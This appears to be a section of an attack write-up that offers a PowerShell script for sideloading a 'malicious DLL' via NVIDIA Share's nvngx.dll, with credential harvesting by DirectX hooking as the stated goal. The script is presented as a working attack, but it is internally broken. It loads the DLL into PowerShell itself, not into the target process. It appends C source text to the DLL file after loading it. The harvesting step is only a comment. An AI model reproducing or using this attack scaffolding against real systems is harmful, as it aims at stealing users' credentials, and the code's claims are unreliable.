### 2.3 Sideloading Malicious DLL via PowerShell

The following PowerShell code leverages NVIDIA Share.exe's nvngx.dll loading mechanism to sideload a malicious DLL implementing credential harvesting via DirectX hooking:

```powershell
$targetProcess = Get-Process | Where-Object { $_.ProcessName -eq "NVIDIA Share" }
$targetPID = $targetProcess.Id

$maliciousDLL = "C:\path\to\malicious.dll"
$targetDLL = "C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience\nvngx.dll"

[Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices") | Out-Null
$kernel32 = Add-Type -memberDefinition @'
[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string dllToLoad);
[DllImport("kernel32.dll")]
public static extern bool FreeLibrary(IntPtr hModule);
[DllImport("kernel32.dll")]
public static extern bool SetDllDirectory(string lpPathName);
'@ -name "Kernel32" -namespace Win32Functions -passThru

$kernel32::SetDllDirectory("C:\Program Files\NVIDIA Corporation\NVIDIA GeForce Experience\")
$moduleHandle = $kernel32::LoadLibrary($maliciousDLL)

$hookCode = @"
#include <Windows.h>
BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        // Implement credential harvesting via DirectX hooking
    }
    return TRUE;
}
"@

Add-Content -Path $maliciousDLL -Value $hookCode

$kernel32::FreeLibrary($moduleHandle)
```

